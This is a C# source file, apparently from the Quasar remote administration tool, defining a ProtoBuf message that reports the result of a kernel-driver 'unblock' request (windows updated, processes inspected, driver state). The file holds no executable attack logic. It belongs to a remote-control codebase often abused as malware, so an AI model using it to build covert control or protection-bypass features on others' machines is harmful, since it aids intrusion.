using ProtoBuf;
using Quasar.Common.Enums;

namespace Quasar.Common.Messages
{
    /// <summary>
    /// Reports the outcome of a kernel unblock request.
    /// </summary>
    [ProtoContract]
    public class KernelUnblockResult : IMessage
    {
        [ProtoMember(1)]
        public KernelUnblockResultCode Result { get; set; } = KernelUnblockResultCode.Unknown;

        [ProtoMember(2)]
        public string ProcessName { get; set; }

        [ProtoMember(3)]
        public int WindowsUpdated { get; set; }

        [ProtoMember(4)]
        public int ProcessesInspected { get; set; }

        [ProtoMember(5)]
        public string Message { get; set; }

        [ProtoMember(6)]
        public long ElapsedMilliseconds { get; set; }

        [ProtoMember(7)]
        public KernelDriverState DriverState { get; set; } = KernelDriverState.Unknown;
    }
}
